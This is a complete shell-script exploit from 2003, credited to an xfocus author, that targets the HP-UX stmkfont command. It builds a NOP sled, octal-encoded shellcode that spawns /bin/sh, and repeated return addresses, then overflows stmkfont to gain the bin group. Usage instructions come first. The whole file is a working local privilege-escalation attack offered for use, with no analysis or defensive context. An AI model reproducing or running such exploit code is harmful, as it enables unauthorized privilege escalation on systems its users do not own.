#!/bin/sh
#   File : ex_stmkfont.sh
#   Exploit for command stmkfont of HPUX to get bin gid BUFF.
# * Usage: chmod +x ex_stmkfont.sh ; ./ex_stmkfont.sh
#   Write by watercloud@xfocus.org       2003-2-20
#   Site : www.xfocus.org   www.xfocus.net
NOP_LEN=65
ADDR_LEN=5000
BUFF="";i=0
while [ $i -ne $NOP_LEN ] ; do
  BUFF=$BUFF'\0013\0071\0002\0231'  ; i=$(($i+1))
done
BUFF=$BUFF'\0013\0071\0002\0127\0052\0344\0227\0020\0050\0073\0160\0357\0010\0067\0002\0103'
BUFF=$BUFF'\0266\0372\0100\0004\0266\0371\0100\0004\0266\0370\0100\0004\0344\0140\0340\0010'
BUFF=$BUFF'\0266\0366\0100\0376\0013\0071\0002\0231\0053\0044\0227\0020\0050\0073\0160\0357'
BUFF=$BUFF'\0353\0137\0037\0375\0013\0071\0002\0231\0267\0132\0100\0042\0017\0100\0022\0016'
BUFF=$BUFF'\0010\0071\0002\0103\0344\0140\0340\0010\0264\0026\0160\0026/bin/shX'
i=0;
while [ $i -ne $ADDR_LEN ] ; do
  BUFF=$BUFF'\0177\0177\0001\0020'; i=$(($i+1))
done
STR=`/bin/echo "${BUFF}"`

/usr/bin/stmkfont -d1 x -d2 $STR x
#EOF
